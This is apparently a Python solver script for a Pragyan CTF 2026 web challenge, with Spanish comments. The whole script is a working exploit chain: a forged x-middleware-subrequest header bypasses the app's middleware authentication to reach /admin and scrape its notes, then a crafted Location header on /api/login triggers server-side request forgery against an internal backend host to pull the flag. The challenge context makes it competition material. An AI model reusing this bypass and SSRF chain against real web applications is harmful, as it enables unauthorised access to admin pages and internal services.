#!/usr/bin/env python3
"""
Note Keeper - Pragyan CTF 2026
Exploit: CVE-2025-29927 (middleware bypass) + CVE-2025-57822 (SSRF via Location)
Flag: p_ctf{Ju$t_u$e_VITE_e111d821}
"""

import requests
import base64
import re
import sys

BASE = "https://note-keeper.ctf.prgy.in"
BYPASS = "middleware:middleware:middleware:middleware:middleware"

s = requests.Session()

# ============================================================
# PASO 1: CVE-2025-29927 — Bypass del middleware
# ============================================================
print("[*] Paso 1: Bypass del middleware (CVE-2025-29927)")

r = s.get(f"{BASE}/admin", headers={"x-middleware-subrequest": BYPASS})

if r.status_code == 200 and "Safe Notes App" in r.text:
    print("[+] Acceso a /admin conseguido")
else:
    print(f"[-] Fallo: {r.status_code}")
    sys.exit(1)

# Extraer notas del admin
notes = re.findall(r'"text":"([^"]+)"', r.text)
print(f"[+] {len(notes)} notas extraídas del admin")

# Buscar pistas
for i, note in enumerate(notes, 1):
    if "pastebin" in note.lower() or "backend" in note.lower() or "middleware" in note.lower():
        print(f"    Nota {i} (pista): {note}")

# Decodificar rutas del backend
b64_match = re.search(r'[A-Za-z0-9+/]{20,}={1,2}', r.text)
if b64_match:
    decoded = base64.b64decode(b64_match.group()).decode()
    print(f"[+] Rutas del backend: {decoded}")

# ============================================================
# PASO 2: CVE-2025-57822 — SSRF via Location header
# ============================================================
print(f"\n[*] Paso 2: SSRF al backend interno (CVE-2025-57822)")

flag = None
backend_paths = ["/flag", "/stats", "/notes", "/"]

for path in backend_paths:
    target = f"http://backend:4000{path}"

    r = s.get(f"{BASE}/api/login", headers={"Location": target})

    print(f"\n    GET backend:4000{path}")
    print(f"    Status: {r.status_code}")

    if path == "/flag":
        if "p_ctf{" in r.text:
            flag = r.text.strip()
            print(f"    FLAG: {flag}")
        else:
            print(f"    Response: {r.text[:200]}")
    else:
        print(f"    Response: {r.text[:100]}")

# ============================================================
# Resultado
# ============================================================
print(f"\n{'='*50}")
if flag:
    print(f"FLAG: {flag}")
else:
    print("FLAG no encontrada")
print(f"{'='*50}")
